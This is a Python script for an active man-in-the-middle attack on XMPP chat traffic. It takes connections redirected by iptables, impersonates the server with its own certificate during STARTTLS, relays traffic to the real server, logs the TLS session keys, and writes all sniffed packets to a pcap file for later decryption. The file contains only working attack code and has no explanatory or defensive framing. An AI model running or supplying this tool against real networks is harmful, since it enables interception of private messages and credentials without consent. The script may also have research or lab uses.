#!/usr/bin/env python3

import socket
import copy
from time import time
import threading
import struct
import ssl
import sslkeylog
from scapy.all import sniff, wrpcap
from select import select
import argparse


class Initiator(threading.Thread):
    TIMEOUT = 0.5

    def __init__(self, cert, priv_key, port):
        super().__init__()
        self.cert = cert
        self.priv_key = priv_key
        self.port = port
        self.proxies = []
        self.srv = None

        # Initializes stop event
        self.stop_listen = threading.Event()

    def run(self):

        host = "0.0.0.0"
        port = 8080
        self.srv  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Reuse socket no matter what
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind((host, port))
        self.srv.listen(5)

        print(f"[*] Listening on port {port}")

        while not self.stop_listen.isSet():
            try:
                # Waits for connection until timeout
                # then checks loop condition
                self.srv.settimeout(self.TIMEOUT)
                client_sock, addr = self.srv.accept()
                print(f"[+] Client connected from {addr[0]}:{addr[1]}")

                # Creates mitm proxy
                mitm = ActiveXMPPMITM(self.cert, self.priv_key, client_sock, addr)
                mitm.start()

                # Stores mitm proxy for cleanup
                self.proxies.append(mitm)
                print("Appended to proxy list")

            except socket.timeout:
                pass

        print(f"[*] Stop listening on port {port}")
        self.srv.shutdown(1) # advisory to the socket at the other end
        self.srv.close()


        for p in self.proxies:
            p.stop()
        print(f"[*] Called stop on proxies")

        for p in self.proxies:
            print("[*] Waiting for join")
            p.join()

    def stop(self):
        print(f"[*] Stopping Initiator")
        self.stop_listen.set()


class ActiveXMPPMITM(threading.Thread):
    PORT = 5222
    BUFSIZE = 4096
    TLS_SIG = b"\x16\x03" # 0x16 codes type (handshake msg), 0x03 specifies version (TLS)

    def __init__(self, cert, priv_key, client_sock, client_addr, is_verbose=False):
        super().__init__()
        self.priv_key = priv_key
        self.cert = cert

        # Retrieve orig targeted host
        self.us_ip, self.us_port = self.resolve_orig_target(client_sock)
        print(f"[+] Client targeted {self.us_ip}:{self.us_port}")

        # Initializes upstream socket (to targeted server)
        self.us_sock = None

        # Initializes downstream socket (to victim)
        self.ds_sock = client_sock
        self.ds_ip, self.ds_port = client_addr
        self.is_tls = False
        self.is_verbose = is_verbose

        self.stop_intercepting = threading.Event()

    @staticmethod
    def resolve_orig_target(sock):
        """
        Takes a socket and reads its originally targeted destination by using getoptsock and
        parsing the C-struct, which is returned by it.

        :param sock: socket in question
        :return: (ip, port): tupel of str, int specifying IP address and port number
        """

        # Src.:
        # https://stackoverflow.com/questions/30571630/python-iptables-original-destination-ip
        SO_ORIGINAL_DST = 80 # stands for TCP
        sockaddr_in = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
        # decode C structures encoded as byte strings
        (proto, port, q1, q2, q3, q4) = struct.unpack('!HHBBBB', sockaddr_in[:8])
        #print('Original destination was: %d.%d.%d.%d:%d' % (a, b, c, d, port))

        return ".".join([str(q1), str(q2), str(q3), str(q4)]), port

    def stop(self):
        self.stop_intercepting.set()
        print(f"[*] Stopping MITM")

    def run(self):
        self.us_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.us_sock.connect((self.us_ip, self.us_port))
        self.forward()

    def to_tls(self):
        print("[*] Performing TLS handshake")
        # Set suppress_ragged_eofs to handle unclean shutdowns of SSL sockets

        self.ds_sock = ssl.wrap_socket(self.ds_sock, server_side=True, suppress_ragged_eofs=True,
                                   certfile=self.cert, keyfile=self.priv_key)
        self.us_sock = ssl.wrap_socket(self.us_sock, suppress_ragged_eofs=True)
        print("[*] Created SSL sockets")

    def inspect(self, data_to_check):
        print("[-] Inspecting")
        if data_to_check.startswith(self.TLS_SIG):
            print("[+] TLS record of type handshake detected.")
            return True
        return False

    SOCKET_TIMEOUT = 1.3
    SELECT_TIMEOUT = 0.8

    def forward(self):
        """
        Receives traffic on client socket and forwards it to server socket.
        The read traffic is inspected. If a TLS record structure of type handhshake (0x16) is detected,
        TLS handshakes will be performend on both sockets.

        :param self: class instance
        return None
        """
        self.us_sock.settimeout(self.SOCKET_TIMEOUT)
        self.ds_sock.settimeout(self.SOCKET_TIMEOUT)

        while not self.stop_intercepting.isSet():

            try:
            # Peek for the beginnings of an ssl handshake
                if not self.is_tls:
                    try:
                        data_to_check = self.ds_sock.recv(self.BUFSIZE, socket.MSG_PEEK | socket.MSG_DONTWAIT)
                        print(data_to_check)
                        if self.inspect(data_to_check):
                            self.to_tls()
                            self.is_tls = True
                            #print(f"[+] {sslkeylog.get_keylog_line(self.ds_sock)}")

                    except:
                        # For some reason, MSG_PEEK fails when applied to an SSL
                        # socket
                        pass

                # Retrieve, wether sockets are ready for reading.
                # Perform select() system call. Returns sequences of waitable objects in a triple.
                # wait until ready for reading, wait until ready for writing, wait for a condition)
                # Hand over sockets, which should be observed for readiness to read
                ready_for_read, ready_for_write, waiting = select([self.ds_sock, self.us_sock], [], [], self.SELECT_TIMEOUT)

                # Reads data from client socket
                if self.ds_sock in ready_for_read:
                    p = self.ds_sock.recv(self.BUFSIZE)
                    self.us_sock.send(p)
                    # Prints, if is_Verbose
                    if self.is_verbose:
                        print(f"{self.ds_ip} to {self.us_ip}\n{len(p)} bytes recv\n{repr(p)}\n\n")

                # Reads datat from target socket
                if self.us_sock in ready_for_read:
                    p = self.us_sock.recv(self.BUFSIZE)
                    self.ds_sock.send(p)
                    if self.is_verbose:
                        print(f"{self.us_ip} to {self.ds_ip}\n{len(p)} bytes recv\n{repr(p)}\n\n")

            except socket.error as e:
                print("[!] Socket error!")
                if "timed out" in str(e):
                    print("[!] Socket time out")
                print(e)
                print(f"[!] Stopping interception for {self.us_ip}<->{self.ds_ip}")
                break

        self.shut_sockets()
        print("[!] Stopped forwarding")

    def shut_sockets(self):
        print(f"[-] Closing {self.ds_port}")
        self.ds_sock.shutdown(1)
        self.ds_sock.close()

        print(f"[-] Closing {self.us_port}")
        self.us_sock.shutdown(1)
        self.us_sock.close()

        print(f"[*] Sockets closed")

class Sniffer(threading.Thread):

    def __init__(self, iface, record_file="./packets.pcap"):
        """

        """
        # Informs user about construction of an AP Responder obj
        print(f"[*] Setting up Sniffer")

        # Calls super constructor
        super().__init__()

        # Daemonizes Sniffer, which makes sure, that thread is stopped, if an unhandled exception is raised in main
        self.setDaemon = True
        # Initializes stop event
        self.stop_sniffing = threading.Event()
        # Sets interface
        self.iface = iface

        # Recorder writes pcap
        self.recorder = Recorder(record_file)


    def stop(self):
        """
        Gracefully stop the sniffer thread.

        :return: None
        """
        # Set thread event to stop, shutdown on next received packet
        self.stop_sniffing.set()

        print(f"[*] Stopping Sniffer on {self.iface}")

    def has_to_stop(self, packet):
        """
        This is a wrapper around a stop condition, which is used as a callback for Scapy's sniff(...stop_filter=...)
        function.

        :param packet: received packet, which triggered callbacks
        :return: boolean, which indicates state of the responder
        """

        return self.stop_sniffing.isSet()


    def recv_pkt(self, packet):
        """
        Callback function on packet receive for Scapy's sniff.

        :param packet: scapy packet to check
        :return: None: logs to pcap
        """
        self.recorder.cache_pkt(packet)

    def run(self):
        """
        Sniffs on all packets. This is the worker function of the thread.

        :return: None
        """
        print(f"[+] Starting to sniff {self.iface}")

        # Start sniffing, define callback for packet receiving, define stop condition
        sniff(iface=self.iface, prn=self.recv_pkt, store=0,
              stop_filter=self.has_to_stop)

        # De-intialize after sniffing is stopped
        print(f"[+] Stopped sniffing on {self.iface}")

        # Store leftover cache
        self.recorder.store_cache()

        self.iface = None


class Recorder(object):
    """
    The Recorder object bundles necessary functionality to store packets in a pcap on disk and record important bits
    of the retrieved information in a .csv-file.
    """

    # Specify the amount of packets to collect in memory, before appending them to .pcap-file
    PKT_CACHE_SIZE = 500

    def __init__(self, record_file):
        """
        Constructs a Recorder object.

        :param record_file: filename of the pcap and csv file
        """
        # Prepares packet storage
        self.pcap = record_file
        self.cache_cntr = 0
        self.pkt_cache = []

    def store_cache(self):
        """
        Stores current caches to disk.

        :return: None
        """
        self.write_pkts(self.pcap, self.pkt_cache)

    def cache_pkt(self, pkt):
        """
        Store given packet in cache. If cache is full, dump content to disk.

        :param pkt: scapy packet
        :return: None
        """
        # Appends given packet to cache
        self.pkt_cache.append(pkt)

        # Increments cache counter
        self.cache_cntr += 1

        # If the specified cache size is reached, write cache to .pcap-file
        # by utilizing a worker thread for non-blocking I/O
        if self.cache_cntr >= self.PKT_CACHE_SIZE:
            self.store_cache_async(self.write_pkts, self.pcap, self.pkt_cache)
            # Reset cache
            self.cache_cntr = 0
            self.pkt_cache = []


    @classmethod
    def store_cache_async(cls, target_func, file, content):
        """
        Creates a deepcopy of the given content (list of msgs or packets) and creates a worker thread, in which the
        content is written to the disk.

        :param target_func: function to call
        :param file: output file to write to
        :param content: list of packets or messages

        :return: None
        """
        copied_content = copy.deepcopy(content)
        store_thread = threading.Thread(target=target_func, args=(file, copied_content))
        store_thread.start()

    @classmethod
    def write_pkts(cls, fname, pkts):
        start = time()
        wrpcap(fname, pkts, append=True)  # appends packets to output file
        store_time = round(time() - start, 2)
        print(f"[*] Stored {len(pkts)} cached packets in {store_time} sec.")

def main(iface, pcap_file, sslkeylogfile, port, cert, priv_key):

    # Dump sslkeys
    sslkeylog.set_keylog(sslkeylogfile)
    sslkeylog.patch()

    # Starts sniffing
    sniffer = Sniffer(iface, pcap_file)
    sniffer.start()

    # Starts proxying
    initiator = Initiator(cert, priv_key, port)
    initiator.start()

    import signal

    def signal_handler(signal_number, frame):
        sniffer.stop()
        sniffer.join()
        initiator.stop()
        initiator.join()
        exit()
    signal.signal(signal.SIGINT, signal_handler)
    signal.pause()


if __name__=="__main__":
    parser = argparse.ArgumentParser(description="This script decrypts TLS encrypted XMPP traffic by acting as an active MiTM and observing for STARTTLS requests. Furtheron it sniffs on the specified interface and dumps SSL keys of its handshakes.\nIt listens on the specified port, where the XMPP traffic should be redirected to (.e.g with iptables). When the client wants to connect, the proxy acts as the legitimate server, opens another socket to the actual target of the client and forwards the traffic in both directions. If STARTTLS messages and according TLS-record handshake signature '0x16 0x03' are observed, then TLS handshakes will be performed on both sides and the pre-master secrets will be logged for later inspection and decryption of the stored packets (e.g. with wireshark).")

    parser.add_argument("--iface", "-i", type=str, default="enp0s3", help="NIC to sniff from")
    parser.add_argument("--write_file", "-w", type=str, default="packets.pcap", help="Path to .pcap-file to store sniffed packets")
    parser.add_argument("--sslkeylog", "-s", type=str, default="./sslkeylogfile.txt", help="Path to .txt-file to store pre-master secrets and session keys")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Port to listen on. Iptables has to redirect here")
    parser.add_argument("--cert", "-c", type=str, default="./ca2.crt", help="Path to cert file to use as server")
    parser.add_argument("--key", "-k", type=str, default="./ca2.key", help="Path to key file corresponding to a/m cert")
    args = parser.parse_args()

    main(args.iface, args.write_file, args.sslkeylog, args.port, args.cert, args.key)

